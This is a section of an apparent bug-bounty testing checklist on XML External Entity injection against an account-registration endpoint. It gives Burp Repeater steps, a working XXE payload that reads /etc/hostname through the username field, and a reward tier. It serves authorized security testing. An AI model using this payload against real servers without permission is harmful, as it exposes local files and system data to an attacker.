## 5️⃣ Test Way 5: XML External Entity (XXE) via Structured Registration Formats
If the registration endpoint processes or accepts alternative data types like XML or custom documents, this checks if forcing format adjustments exposes the server to local file enumeration.

* 🎯 Target Parameters: Content-Type Header and Request Body.
* 📋 Step-by-Step Execution:
1. Capture a JSON registration request in Burp Repeater.
   2. Change the header line to Content-Type: application/xml.
   3. Replace the request body entirely with a structured XML data object carrying an external system read entity payload. [17, 18] 
* 💉 Payloads:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE register [  
  <!ENTITY xxe SYSTEM "file:///etc/hostname"> 
]>
<registrationRequest>
  <username>&xxe;</username>
  <password>TestPassword123!</password>
  <email>test@h1.alias</email>
</registrationRequest>

* 🔍 Response Verification Criteria: Hit Send. If the application accepts the XML schema and successfully creates the account, check the response or verification email. If the server prints its internal system hostname instead of a standard username, a critical input handling error is present. [19] 
* 💰 Policy Match / Reward: Local file access / manipulation (LFR, RFI, XXE) — $1,200 USD (Critical Severity)

